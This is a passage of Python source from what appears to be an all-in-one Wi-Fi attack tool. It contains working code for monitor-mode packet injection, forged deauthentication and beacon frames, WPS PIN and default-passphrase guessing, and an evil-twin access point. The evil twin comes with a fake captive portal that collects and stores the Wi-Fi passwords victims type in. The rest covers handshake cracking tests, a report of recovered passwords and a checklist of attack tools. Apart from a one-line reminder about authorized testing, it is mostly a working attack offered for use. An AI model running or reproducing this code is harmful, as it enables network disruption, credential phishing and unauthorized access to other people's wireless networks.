        return cur.startswith("monitor"), f"current mode: {cur}"
    if IS_LINUX:
        rc, out = run(["iw", "dev", iface, "info"])
        if "type monitor" in out:
            return True, "monitor mode active"
        rc, out = run(["iw", "list"])
        if "monitor" in out:
            return True, "monitor mode supported"
        return False, "monitor mode unsupported by driver"
    if IS_MAC:
        return False, "macOS: no native monitor mode (use another adapter)"
    return None, "unknown platform"


def set_monitor(iface: str, on: bool) -> bool:
    if IS_WIN:
        h = npcap_helper()
        if not h:
            warn("Npcap WlanHelper missing -> install Npcap with raw 802.11 support")
            return False
        rc, out = run([h, iface, "mode", "monitor" if on else "managed"], timeout=20)
        if "failure" in out.lower() or "error" in out.lower():
            bad(out.strip().splitlines()[-1][:160])
            return False
        ok(f"mode -> {'monitor' if on else 'managed'}")
        return True
    if IS_LINUX:
        if on:
            run(["ip", "link", "set", iface, "down"])
            run(["iw", iface, "set", "type", "monitor"])
            run(["ip", "link", "set", iface, "up"])
        else:
            run(["ip", "link", "set", iface, "down"])
            run(["iw", iface, "set", "type", "managed"])
            run(["ip", "link", "set", iface, "up"])
        return True
    warn("monitor mode switching unsupported on this platform")
    return False


def set_channel(iface: str, channel: int) -> bool:
    if not channel:
        return False
    if IS_WIN:
        h = npcap_helper()
        if not h:
            return False
        rc, out = run([h, iface, "channel", str(channel)], timeout=15)
        return rc == 0 and "failure" not in out.lower()
    if IS_LINUX:
        rc, _ = run(["iw", "dev", iface, "set", "channel", str(channel)], timeout=10)
        return rc == 0
    return False


def build_deauth(ap: bytes, sta: bytes, reason: int = 7, seq: int = 0) -> bytes:
    hdr = (
        b"\xc0\x00" + b"\x00\x00" + sta + ap + ap
        + struct.pack("<H", (seq % 4096) << 4)
    )
    return hdr + struct.pack("<H", reason)


def build_beacon(ssid: bytes, bssid: bytes, channel: int = 1, seq: int = 0) -> bytes:
    body = b"\x00" * 8 + b"\x64\x00" + b"\x11\x04"
    body += bytes([0, len(ssid)]) + ssid
    body += bytes([1, 4]) + bytes([0x82, 0x84, 0x8B, 0x96])
    body += bytes([3, 1, channel])
    body += bytes([5, 4, 0x01, 0x03, 0x00, 0x00])
    body += bytes([48, 20]) + bytes.fromhex("0100000fac040100000fac040100000fac020000")
    hdr = (
        b"\x80\x00" + b"\x00\x00" + b"\xff\xff\xff\xff\xff\xff" + bssid + bssid
        + struct.pack("<H", (seq % 4096) << 4)
    )
    return hdr + body


RADIOTAP_BASE = b"\x00\x00\x08\x00" + b"\x00\x00\x00\x00"


class NpcapSender:
    """minimal pcap_sendpacket wrapper (no external python deps)."""

    def __init__(self, iface: str):
        import ctypes

        guid = iface_guid_windows(iface)
        if not guid:
            raise RuntimeError(f"cannot resolve GUID for interface {iface!r}")
        device = f"\\Device\\NPF_{{{guid.upper()}}}"
        dll = None
        for cand in (
            Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32" / "Npcap" / "wpcap.dll",
            Path(r"C:\Windows\System32\wpcap.dll"),
        ):
            if cand.exists():
                dll = str(cand)
                break
        if not dll:
            raise RuntimeError("wpcap.dll not found (Npcap missing)")
        self._c = ctypes
        self.pcap = ctypes.WinDLL(dll)
        self.pcap.pcap_open_live.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_char_p]
        self.pcap.pcap_open_live.restype = ctypes.c_void_p
        self.pcap.pcap_sendpacket.argtypes = [ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int]
        self.pcap.pcap_sendpacket.restype = ctypes.c_int
        self.pcap.pcap_close.argtypes = [ctypes.c_void_p]
        err = ctypes.create_string_buffer(512)
        self.handle = self.pcap.pcap_open_live(device.encode(), 65535, 1, 100, err)
        if not self.handle:
            raise RuntimeError(f"pcap_open_live failed: {err.value.decode(errors='replace')}")
        self.radiotap = True

    def send(self, frame: bytes) -> bool:
        data = (RADIOTAP_BASE + frame) if self.radiotap else frame
        return self.pcap.pcap_sendpacket(self.handle, data, len(data)) == 0

    def close(self) -> None:
        try:
            self.pcap.pcap_close(self.handle)
        except Exception:
            pass


class RawSender:
    """AF_PACKET injection for Linux monitor interfaces."""

    def __init__(self, iface: str):
        self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        self.s.bind((iface, 0))
        self.radiotap = False

    def send(self, frame: bytes) -> bool:
        try:
            self.s.send(frame)
            return True
        except OSError:
            return False

    def close(self) -> None:
        self.s.close()


def make_sender(iface: str, backend: str = "auto"):
    if backend in ("auto", "scapy"):
        try:
            from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore

            class ScapySender:
                radiotap = True

                def __init__(self) -> None:
                    self.sendp = sendp

                def send(self, frame: bytes) -> bool:
                    try:
                        # frame already includes 802.11 header; reuse raw payload
                        self.sendp(RadioTap() / frame, iface=iface, verbose=False)
                        return True
                    except Exception:
                        return False

                def close(self) -> None:
                    pass

            s = ScapySender()
            s.send(build_beacon(b"x", b"\x02\x00\x00\x00\x00\x01"))  # smoke test
            info("injection backend: scapy")
            return s
        except Exception as e:  # noqa: BLE001
            if backend == "scapy":
                bad(f"scapy backend unavailable: {e}")
                return None

    if IS_WIN or backend == "npcap":
        try:
            s = NpcapSender(iface)
            info("injection backend: Npcap pcap_sendpacket")
            return s
        except Exception as e:  # noqa: BLE001
            bad(f"Npcap sender: {e}")
            return None
    if IS_LINUX or backend == "packet":
        try:
            s = RawSender(iface)
            info("injection backend: AF_PACKET raw socket")
            return s
        except Exception as e:  # noqa: BLE001
            bad(f"raw socket: {e}")
            return None
    return None


def require_scapy() -> bool:
    try:
        import scapy.all  # type: ignore  # noqa: F401

        return True
    except Exception:
        bad("live capture needs scapy:  pip install scapy  (plus Npcap on Windows)")
        return False


def live_capture(
    iface: str,
    seconds: float,
    collector: Collector,
    channel: int | None = None,
    pcap_out: str | Path | None = None,
    deauth: tuple[str, str | None] | None = None,
    hop: bool = False,
) -> Collector:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, sniff, wrpcap  # type: ignore

    if channel:
        set_channel(iface, channel)
    if deauth:
        ap_b = mac_bytes(deauth[0])
        sta_b = mac_bytes(deauth[1]) if deauth[1] else b"\xff" * 6
        sendp(
            RadioTap() / Dot11(type=0, subtype=12, addr1=sta_b, addr2=ap_b, addr3=ap_b) / Dot11Deauth(reason=7),
            iface=iface,
            count=8,
            inter=0.15,
            verbose=False,
        )

    hop_thread = None
    if hop:
        def hopper() -> None:
            i = 0
            while not stop_flag[0]:
                set_channel(iface, [1, 6, 11, 3, 9, 13][i % 6])
                i += 1
                time.sleep(0.7)

        stop_flag = [False]
        hop_thread = threading.Thread(target=hopper, daemon=True)
        hop_thread.start()

    info(f"capturing on {iface} for {seconds:.0f}s ...")
    pkts = sniff(iface=iface, timeout=seconds, store=True, prn=lambda p: collector.feed(bytes(p)))
    if hop_thread:
        stop_flag[0] = True
    if pcap_out:
        wrpcap(str(pcap_out), pkts)
        ok(f"pcap saved: {pcap_out}")
    return collector


# --------------------------------------------------------------------------------------
# WPS
# --------------------------------------------------------------------------------------
def wps_checksum(pin7: str) -> str:
    acc = 0
    for i, ch in enumerate(pin7):
        acc += (3 if i % 2 == 0 else 1) * int(ch)
    return str((10 - acc % 10) % 10)


def wps_pins(bssid: str, ssid: str = "", limit: int = 200) -> list[str]:
    pins: list[str] = []
    h = re.sub(r"[^0-9a-f]", "", bssid.lower())
    ssid_digits = re.sub(r"\D", "", ssid)

    def add(v: str) -> None:
        v = re.sub(r"\D", "", v)
        if len(v) >= 7:
            v7 = v[:7]
            p = v7 + wps_checksum(v7)
            if p not in pins:
                pins.append(p)

    for known in ("1234567", "0000000", "1111111", "2222222", "3333333", "4444444",
                  "5555555", "6666666", "7777777", "8888888", "9999999", "0123456",
                  "9743562", "4626484", "1144302", "3050233", "8063254", "9865544"):
        add(known)
    if ssid_digits:
        add(ssid_digits[:7])
        add(ssid_digits[-7:])
    if len(h) >= 6:
        for chunk in (h[-6:], h[:6], h[6:12] or h[-6:]):
            add(str(int(chunk, 16)))
            add(str(int(chunk[::-1], 16)))
        add(str(int(h, 16))[-7:])
        add(str(int(h, 16))[:7])
        mac_dec = str(int(h, 16)).zfill(12)
        add(mac_dec[-7:])
        add(mac_dec[:7])
    return pins[:limit]


def wps_scan(iface: str) -> list[dict]:
    if not have("wash"):
        warn("wash not found (aircrack-ng package) - falling back to beacon scan")
        out = []
        for a in scan_aps(iface=iface):
            out.append({"bssid": a.bssid, "ssid": a.ssid, "channel": a.channel,
                        "wps": "?" if a.wps is None else ("yes" if a.wps else "no"), "lock": "?"})
        return out
    rc, out = run(["wash", "-i", iface], timeout=45)
    rows = []
    for line in out.splitlines():
        f = line.split()
        if len(f) >= 5 and _MAC_RE.fullmatch(f[0]):
            rows.append({"bssid": f[0], "channel": f[1], "rssi": f[2], "wps": f[3], "lock": f[4],
                         "ssid": " ".join(f[5:])})
    return rows


# --------------------------------------------------------------------------------------
# keygen (default / MAC-derived passphrases)
# --------------------------------------------------------------------------------------
VENDOR_DEFAULTS = {
    "TP-Link": ["admin", "admin123", "12345678", "tplink", "TP-Link"],
    "D-Link": ["admin", "D-Link", "dlink", "12345678"],
    "Netgear": ["password", "admin", "netgear", "Netgear"],
    "ASUS": ["admin", "asus", "Asus1234"],
    "Zyxel": ["1234", "admin", "zyxel", "zyxel1234"],
    "Huawei": ["admin", "huawei", "admin123", "Huawei@123"],
    "MikroTik": ["admin", "mikrotik", "12345678"],
    "Tenda": ["admin", "tenda", "12345678"],
    "Mercusys": ["admin", "mercusys", "12345678"],
    "Belkin": ["admin", "belkin"],
    "Ubiquiti": ["ubnt", "ubiquiti"],
}


def keygen(mac: str, ssid: str = "", vendor: str = "", limit: int = 500) -> list[str]:
    h = re.sub(r"[^0-9a-f]", "", mac.lower()).ljust(12, "0")
    last6 = h[-6:]
    cands: list[str] = []

    def add(v: str) -> None:
        if v and 8 <= len(v) <= 63 and v not in cands:
            cands.append(v)

    templates = [
        "{last6}", "{last6u}", "{mac12}", "{mac12u}", "{oui}{last6}",
        "UPC{dec7}", "WLAN{last6u}", "wlan{last6}", "{ssid}", "{ssid}{last4}",
        "{ssid}1234", "{ssid}12345", "{ssid}!", "{ssid}@123", "{ssidlower}1234",
        "{dec8}", "{hexrev}", "{last4}{last4}",
    ]
    dec = str(int(h, 16))
    ctx = {
        "last6": last6,
        "last6u": last6.upper(),
        "last4": h[-4:],
        "mac12": h,
        "mac12u": h.upper(),
        "oui": h[:6],
        "dec7": dec[-7:].zfill(7),
        "dec8": dec[-8:].zfill(8),
        "hexrev": last6[::-1],
        "ssid": ssid,
        "ssidlower": ssid.lower(),
    }
    for t in templates:
        try:
            add(t.format(**ctx))
        except Exception:
            pass
    for i in range(10):
        add(f"{ssid}{i}")
        add(f"{h[-4:]}{i:04d}")
    for d in range(1000, 10000, 111):  # 1000,1111,...
        add(f"{h[-4:]}{d}")
    for v in VENDOR_DEFAULTS.get(vendor, []):
        add(v)
        add(v + h[-4:])
        add(v.capitalize() + h[-4:])
    for w in ("12345678", "password", "1234567890", "admin1234"):
        add(w)
    return cands[:limit]


# --------------------------------------------------------------------------------------
# evil twin / captive portal
# --------------------------------------------------------------------------------------
PORTAL_HTML = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi login</title>
<style>
 *{{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif}}
 body{{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b1220;color:#e6edf6}}
 .card{{width:min(420px,92vw);background:#131c2e;border:1px solid #22304a;border-radius:16px;padding:26px}}
 h1{{font-size:19px;margin:0 0 6px}} p{{color:#93a4c0;font-size:13px;margin:0 0 18px}}
 label{{font-size:12px;color:#9fb0cc}} input{{width:100%;padding:11px;margin:6px 0 14px;
  border-radius:10px;border:1px solid #2b3a55;background:#0e1729;color:#e6edf6}}
 button{{width:100%;padding:12px;border:0;border-radius:10px;background:#2f81f7;color:#fff;
  font-weight:600;font-size:15px}} .ssid{{color:#5eead4;font-weight:600}}
 .foot{{margin-top:14px;font-size:11px;color:#5b6b86}}
</style></head><body>
<div class="card">
 <h1>Sign in to <span class="ssid">{ssid}</span></h1>
 <p>Enter the Wi-Fi password to continue.</p>
 <form method="post" action="/submit">
  <label>Password</label>
  <input name="password" type="password" inputmode="text" autofocus required>
  <label>Repeat (optional)</label>
  <input name="password2" type="password">
  <button type="submit">Connect</button>
 </form>
 <div class="foot">{hint}</div>
</div></body></html>
"""

PORTAL_OK = "<h2 style='font-family:system-ui'>Connecting...</h2><p>{msg}</p>"


def write_evil_configs(outdir: Path, ssid: str, iface: str, channel: int, bssid: str | None) -> dict:
    outdir.mkdir(parents=True, exist_ok=True)
    hostapd = outdir / "hostapd.conf"
    hostapd.write_text(
        "interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={ch}\n"
        "auth_algs=1\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
        "wpa_passphrase={psk}\nignore_broadcast_ssid=0\n".format(
            iface=iface, ssid=ssid, ch=channel, psk="hunter12345"
        ),
        encoding="utf-8",
    )
    dnsmasq = outdir / "dnsmasq.conf"
    dnsmasq.write_text(
        "interface={i}\ndhcp-range=10.0.0.10,10.0.0.80,12h\ndhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-resolv\nlog-queries\n".format(i=iface),
        encoding="utf-8",
    )
    (outdir / "portal.html").write_text(
        PORTAL_HTML.format(ssid=html.escape(ssid), hint=f"channel {channel}" + (f" | bssid {bssid}" if bssid else "")),
        encoding="utf-8",
    )
    return {"hostapd": hostapd, "dnsmasq": dnsmasq, "portal": outdir / "portal.html"}


class PortalServer:
    def __init__(self, bind: str, port: int, ssid: str, targets: list[Target], found_path: Path | None):
        self.bind = bind
        self.port = port
        self.ssid = ssid
        self.targets = targets
        self.found_path = found_path
        self.hits: list[tuple[str, bool]] = []
        self.stop = threading.Event()
        self._srv = None

    def start(self) -> "PortalServer":
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, fmt: str, *a) -> None:  # silence default log
                pass

            def _send(self, body: str, code: int = 200) -> None:
                data = body.encode()
                self.send_response(code)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self) -> None:  # noqa: N802
                if self.path.startswith(("/generate_204", "/hotspot-detect.html", "/connecttest.txt", "/ncsi.txt")):
                    self.send_response(302)
                    self.send_header("Location", "/")
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                self._send(PORTAL_HTML.format(ssid=html.escape(outer.ssid), hint="captive portal"))

            def do_POST(self) -> None:  # noqa: N802
                ln = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(ln).decode("utf-8", "replace")
                fields = {}
                for pair in raw.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        fields[k] = v.replace("+", " ")
                from urllib.parse import unquote_plus

                pw = unquote_plus(fields.get("password", ""))
                pw2 = unquote_plus(fields.get("password2", ""))
                verdict = "no hash to verify"
                valid = False
                if pw and outer.targets:
                    valid = any(verify_password(t, pw) for t in outer.targets)
                    verdict = "VALID" if valid else "wrong"
                say("")
                ok(f"portal submit: {pw!r} ({verdict})" if valid else f"portal submit: {pw!r} ({verdict})")
                outer.hits.append((pw, valid))
                if outer.found_path and pw:
                    with outer.found_path.open("a", encoding="utf-8") as f:
                        f.write(json.dumps({"uid": "portal", "target": outer.ssid, "password": pw,
                                            "valid": valid, "ts": time.time()}) + "\n")
                msg = "password verified OK" if valid else ("saved, checking..." if pw2 else "saved")
                self._send(PORTAL_OK.format(msg=msg))

        self._srv = ThreadingHTTPServer((self.bind, self.port), Handler)
        threading.Thread(target=self._srv.serve_forever, daemon=True).start()
        return self

    def shutdown(self) -> None:
        if self._srv:
            try:
                self._srv.shutdown()
                self._srv.server_close()
            except Exception:
                pass


# --------------------------------------------------------------------------------------
# report
# --------------------------------------------------------------------------------------
REPORT_CSS = """
:root{color-scheme:dark}*{box-sizing:border-box}
body{margin:0;padding:28px;background:#0b1220;color:#e6edf6;font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
h1{font-size:22px;margin:0 0 4px}h2{font-size:16px;margin:26px 0 10px;color:#9fb0cc}
.sub{color:#7c8ca8;font-size:12px;margin-bottom:18px}
table{border-collapse:collapse;width:100%;font-size:12.5px;margin-bottom:10px}
th,td{padding:7px 9px;border-bottom:1px solid #1e2a40;text-align:left;vertical-align:top}
th{color:#8ea3c2;font-weight:600;background:#111a2b;position:sticky;top:0}
tr:hover td{background:#0f1728}
.tag{display:inline-block;padding:1px 7px;border-radius:99px;font-size:11px;font-weight:600}
.open{background:#7c2d12;color:#fdba74}.wep{background:#713f12;color:#fde68a}
.wpa{background:#1e3a8a;color:#93c5fd}.wpa2{background:#14532d;color:#86efac}
.wpa3{background:#4c1d95;color:#c4b5fd}.bad{background:#3f1d1d;color:#fca5a5}
.sig{font-family:ui-monospace,monospace;letter-spacing:-1px}
.pw{font-family:ui-monospace,monospace;color:#5eead4;font-weight:700;font-size:13px}
.card{background:#101a2c;border:1px solid #1e2a40;border-radius:12px;padding:14px 18px;margin:14px 0}
.k{color:#7c8ca8;font-size:12px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
.n{font-size:20px;font-weight:700}
code{background:#0a1220;padding:1px 5px;border-radius:5px}
footer{margin-top:30px;color:#5b6b86;font-size:11px}
"""


def build_report(scan: list[dict], found: list[dict], out: Path, pcap_info: dict | None = None) -> Path:
    found_by_ssid = defaultdict(list)
    for f in found:
        label = f.get("target", "")
        base = re.sub(r"\s*\[(pmkid|eapol)\]\s*$", "", label)
        found_by_ssid[base].append(f)
    open_n = sum(1 for a in scan if a.get("sec") == "OPEN")
    vuln_n = sum(1 for a in scan if a.get("sec") in ("OPEN", "WEP"))
    rows = []
    for i, a in enumerate(sorted(scan, key=lambda x: -int(x.get("signal", 0))), 1):
        sec = (a.get("sec") or "?").lower().replace("/", "")
        pw = found_by_ssid.get(f"{a.get('ssid')} ({a.get('bssid')})", [])
        cell = ", ".join(f"<span class='pw'>{html.escape(p['password'])}</span>" for p in pw) or "<span class='k'>-</span>"
        rows.append(
            "<tr><td>{i}</td><td>{ssid}</td><td><code>{bssid}</code></td>"
            "<td class='sig'>{sig}%</td><td>{ch}</td><td>{band}</td>"
            "<td><span class='tag {sec}'>{sec_txt}</span></td><td>{enc}</td><td>{wps}</td><td>{cell}</td><td class='k'>{adv}</td></tr>".format(
                i=i,
                ssid=html.escape(a.get("ssid") or "<hidden>"),
                bssid=html.escape(a.get("bssid", "")),
                sig=a.get("signal", 0),
                ch=a.get("channel", "?"),
                band=html.escape(a.get("band", "")),
                sec=sec,
                sec_txt=html.escape(a.get("sec", "?")),
                enc=html.escape(a.get("enc", "?")),
                wps="?" if a.get("wps") is None else ("yes" if a.get("wps") else "no"),
                cell=cell,
                adv=html.escape(a.get("advice", "")),
            )
        )
    pw_rows = "".join(
        "<tr><td>{}</td><td class='pw'>{}</td><td>{}</td></tr>".format(
            html.escape(f.get("target", "")), html.escape(f.get("password", "")),
            html.escape(str(f.get("from", ""))),
        )
        for f in found
    )
    pw_section = ""
    if pw_rows:
        pw_section = (
            "<h2>recovered passwords</h2><table><thead><tr><th>TARGET</th>"
            "<th>PASSWORD</th><th>SOURCE</th></tr></thead><tbody>" + pw_rows + "</tbody></table>"
        )
    body = f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>{APP} report</title><style>{REPORT_CSS}</style></head><body>
<h1>{APP} - wireless audit report</h1>
<div class="sub">generated {time.strftime('%Y-%m-%d %H:%M:%S')} | host {html.escape(platform.node())} | {html.escape(platform.platform())}</div>
<div class="card"><div class="grid">
<div><div class="k">networks</div><div class="n">{len(scan)}</div></div>
<div><div class="k">open</div><div class="n">{open_n}</div></div>
<div><div class="k">weak (open/WEP)</div><div class="n">{vuln_n}</div></div>
<div><div class="k">passwords recovered</div><div class="n">{len(found)}</div></div>
</div></div>
<h2>networks</h2>
<table><thead><tr>
<th>#</th><th>SSID</th><th>BSSID</th><th>SIG</th><th>CH</th><th>BAND</th>
<th>SECURITY</th><th>CIPHER</th><th>WPS</th><th>PASSWORD</th><th>ATTACK SURFACE</th>
</tr></thead><tbody>{''.join(rows) or '<tr><td colspan=11>no data</td></tr>'}</tbody></table>
{pw_section}
<footer>{APP} v{VERSION} - only test networks you are authorized to test.</footer>
</body></html>"""
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(body, encoding="utf-8")
    return out


# --------------------------------------------------------------------------------------
# capability check
# --------------------------------------------------------------------------------------
# tools that only matter on unix-like hosts (windows gets them through kali/wsl)
WIN_OPTIONAL = {"hcxdumptool", "hcxtools", "reaver", "bully", "pixiewps", "wash", "hostapd", "dnsmasq"}

TOOL_REQS = (
    ("scapy", "python pkg: live capture + injection", "pkg install python && pip install scapy"),
    ("pywifi", "python pkg: scan without netsh", "pip install pywifi"),
    ("tshark", "wireshark cli: capture/convert", "pkg install tshark   (deb: apt install tshark)"),
    ("dumpcap", "wireshark cli: raw capture", "ships with tshark/wireshark"),
    ("hashcat", "GPU cracking (22000 mode)", "pkg install root-repo && pkg install hashcat"),
    ("aircrack-ng", "WEP/handshake cracking", "pkg install root-repo && pkg install aircrack-ng"),
    ("hcxdumptool", "PMKID/SAE capture", "build: github.com/ZerBea/hcxdumptool"),
    ("hcxtools", "pcap -> 22000 conversion", "build: github.com/ZerBea/hcxtools"),
    ("reaver", "WPS attack", "apt install reaver   (termux: build from source)"),
    ("bully", "WPS attack (alternative)", "apt install bully"),
    ("pixiewps", "offline WPS pixie-dust", "pkg install root-repo && pkg install pixiewps"),
    ("wash", "WPS AP discovery", "comes with reaver, or build: github.com/t6x/reaver-wps-fork-t6x"),
    ("hostapd", "evil twin AP", "apt install hostapd   (termux: build from source)"),
    ("dnsmasq", "evil twin dhcp/dns", "pkg install root-repo && pkg install dnsmasq"),
)


def cmd_doctor(args) -> int:
    hr("capability check")
    say(f"platform    : {platform.platform()}")
    say(f"python      : {platform.python_version()} ({sys.executable})")
    say(f"privileges  : {col('admin/root', C.GRN) if is_admin() else col('normal user', C.YEL)}")
    if not is_admin():
        warn("scanning works, but monitor mode / injection usually wants admin/root")
    say("")

    iface = wifi_iface_name(args.iface)
    say(f"interface   : {iface or col('none found', C.RED)}")
    if iface:
        for i in list_ifaces_windows() if IS_WIN else []:
            if i.get("Name") == iface:
                say(f"  driver    : {i.get('Description', '?')}")
                say(f"  mac       : {i.get('Physical address', '?')}")
                say(f"  state     : {i.get('State', '?')}")
        sup, msg = monitor_status(iface)
        icon = col("yes", C.GRN) if sup else col("no", C.RED) if sup is False else col("?", C.YEL)
        say(f"  monitor   : {icon} - {msg}")
        say(f"  injection : {col('yes', C.GRN) if sup else col('no/best-effort', C.YEL)}")

    say("")
    say("external tools:")
    ready = 0
    total = 0
    missing: list[str] = []
    for tool, note, hint in TOOL_REQS:
        optional_here = IS_WIN and tool in WIN_OPTIONAL
        if tool in ("scapy", "pywifi"):
            try:
                __import__(tool)
                ok_here = True
            except Exception:
                ok_here = False
        else:
            ok_here = have(tool)
        mark = col("OK ", C.GRN) if ok_here else (col("n/a", C.DIM) if optional_here else col("-- ", C.RED))
        say(f"  {mark} {tool:14s} {note}")
        if not ok_here and not optional_here:
            missing.append(tool)
            say(f"       {col('fix:', C.DIM)} {hint}")
        if not optional_here:
            total += 1
            ready += 1 if ok_here else 0
    mark = col("complete", C.GRN) if not missing else col(f"{total - ready} missing", C.YEL)
    say("")
    say(f"requirements: {ready}/{total} - {mark}")
    if missing:
        say(f"run {col('bash setup.sh', C.CYN)} to install what can be installed here")

    say("")
    hr("what actually works here")
    if IS_TERMUX:
        say(f"termux      : {col('yes', C.GRN)}")
        say(f"termux-api  : {col('installed', C.GRN) if have('termux-wifi-scaninfo') else col('MISSING', C.RED)}")
        say(f"root        : {col('yes', C.GRN) if is_admin() else col('no', C.YEL)}")
        say(f"storage     : {'~/storage present' if Path.home().joinpath('storage').exists() else 'run termux-setup-storage for shared storage'}")
        say("")
        say("on android the adapter stays in managed mode, so:")
        say(f"  {col('works', C.GRN)}  : scan (termux-api), pcap analysis, hash, crack, keygen, key verify, report")
        say(f"  {col('no', C.RED)}  : monitor mode / handshake capture / injection / deauth")
        say("")
        say("to actually capture on the phone you need root + a patched driver (nexmon), then:")
        say("  su -c 'iw dev wlan0 set type monitor'  (only on supported chips)")
        say("otherwise: capture the pcap on a laptop, copy it here and run: hash -> crack")
        say("install scan support:  pkg install termux-api   (+ Termux:API app + location permission)")
        say("install cracking extras:  pkg install python-numpy   pip install scapy")
        if not have("termux-wifi-scaninfo"):
            warn("scan backend missing right now")
    elif IS_WIN:
        h = npcap_helper()
        say(f"npcap helper: {h or col('missing', C.RED)}")
        if h:
            rc, out = run([h, iface or "Wi-Fi", "mode"], timeout=15)
            raw_ok = "raw 802.11" not in out.lower() and "error" not in out.lower()
            say(f"raw 802.11 : {col('enabled', C.GRN) if raw_ok else col('DISABLED', C.RED)}")
        say("")
        say("on Windows without raw 802.11 Npcap support you can still:")
        say("  * scan everything and write reports")
        say("  * convert pcap/pcapng captured by someone else and crack it")
        say("to get monitor mode + injection on this box:")
        say("  1) uninstall Npcap, reinstall from https://npcap.com with")
        say("     'Support raw 802.11 traffic (and 802.11 traffic)' ticked")
        say("  2) driver must allow NetMon mode (Realtek/Ralink USB sticks often do)")
        say("  3) run this tool from an elevated terminal")
        say("alternatives: Kali on a USB stick / VM with USB passthrough, or a rooted Android.")
    elif IS_LINUX:
        say("linux: monitor mode + injection should work (airmon-ng or iw).")
        if not is_admin():
            warn("re-run as root")
    return 0


# --------------------------------------------------------------------------------------
# selftest
# --------------------------------------------------------------------------------------
def _mk_eapol(msg: int, keyver: int, replay: int, nonce: bytes, key_data: bytes = b"", mic: bytes = b"") -> bytes:
    info = {1: 0x0008 | 0x0020, 2: 0x0008 | 0x0040, 3: 0x0008 | 0x0010 | 0x0020 | 0x0040 | 0x0080,
            4: 0x0008 | 0x0040 | 0x0080}[msg] | (keyver & 7)
    body = (
        bytes([2, 3]) + struct.pack(">H", 95 + len(key_data)) + bytes([2])
        + struct.pack(">H", info) + struct.pack(">H", 16) + struct.pack(">Q", replay)
        + nonce + b"\x00" * 16 + b"\x00" * 8 + b"\x00" * 8 + (mic or b"\x00" * 16)
        + struct.pack(">H", len(key_data)) + key_data
    )
    return body


def _mk_data(ap: bytes, sta: bytes, eapol: bytes, from_ap: bool) -> bytes:
    if from_ap:
        hdr = b"\x08\x02" + b"\x00\x00" + sta + ap + ap + b"\x00\x00"
    else:
        hdr = b"\x08\x01" + b"\x00\x00" + ap + sta + ap + b"\x00\x00"
    return hdr + b"\xaa\xaa\x03\x00\x00\x00\x88\x8e" + eapol


def _mk_beacon(bssid: bytes, ssid: bytes, ch: int = 6) -> bytes:
    return build_beacon(ssid, bssid, ch)


def synth_case(ssid: bytes, pw: bytes, with_pmkid: bool = True) -> tuple[list[bytes], Target, Target]:
    ap = bytes.fromhex("001122334455")
    sta = bytes.fromhex("66778899aabb")
    anonce = bytes(range(32))
    snonce = bytes(range(32, 64))
    frames = [_mk_beacon(ap, ssid)]

    rsn = b"\x01\x00" + b"\x00\x0f\xac\x04" + b"\x01\x00" + b"\x00\x0f\xac\x04" + b"\x01\x00" + b"\x00\x0f\xac\x02"
    pmk = derive_pmk(pw, ssid)
    pmkid = pmkid_for_pmk(pmk, ap, sta)
    m1_data = bytes([48, len(rsn) + 20]) + rsn + struct.pack("<H", 1 << 6) + struct.pack("<H", 1) + pmkid
    m1 = _mk_eapol(1, 2, 7, anonce, m1_data)
    m2 = _mk_eapol(2, 2, 7, snonce)
    data = ptk_input(ap, sta, anonce, snonce)
    mic = mic_for_pmk(pmk, data, eapol_zero_mic(m2), 2)
    m2 = _mk_eapol(2, 2, 7, snonce, mic=mic)
    frames.append(_mk_data(ap, sta, m1, True))
    frames.append(_mk_data(ap, sta, m2, False))

    pmkid_t = Target("pmkid", ssid, ap, sta, pmkid=pmkid)
    eapol_t = Target("eapol", ssid, ap, sta, mic=mic, eapol=m2, anonce=anonce, snonce=snonce, replay=7)
    return frames, pmkid_t, eapol_t


def write_test_pcap(path: Path, frames: list[bytes], radiotap: bool = True) -> None:
    lt = LINKTYPE_IEEE802_11_RADIOTAP if radiotap else LINKTYPE_IEEE802_11
    buf = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, lt)
    ts = int(time.time())
    for f in frames:
        pkt = (RADIOTAP_BASE + f) if radiotap else f
        buf += struct.pack("<IIII", ts, 0, len(pkt), len(pkt)) + pkt
    path.write_bytes(buf)


def cmd_selftest(args) -> int:
    hr("selftest - crypto, parsing, cracking")
    failures = 0

    def check(name: str, cond: bool, extra: str = "") -> None:
        nonlocal failures
        if cond:
            ok(f"{name} {extra}")
        else:
            failures += 1
            bad(f"{name} {extra}")

    # 1) PBKDF2 test vector from IEEE 802.11i
    pmk = derive_pmk(b"ThisIsAPassword", b"ThisIsASSID")
    check("PBKDF2-HMAC-SHA1(4096) 802.11i vector",
          pmk.hex() == "0dc0d6eb90555ed6419756b9a15ec3e3209b63df707dd508d14581f8982721af")

    # 2) PRF / PTK layout
    ptk = prf512(pmk, ptk_input(bytes.fromhex("001122334455"), bytes.fromhex("66778899aabb"),
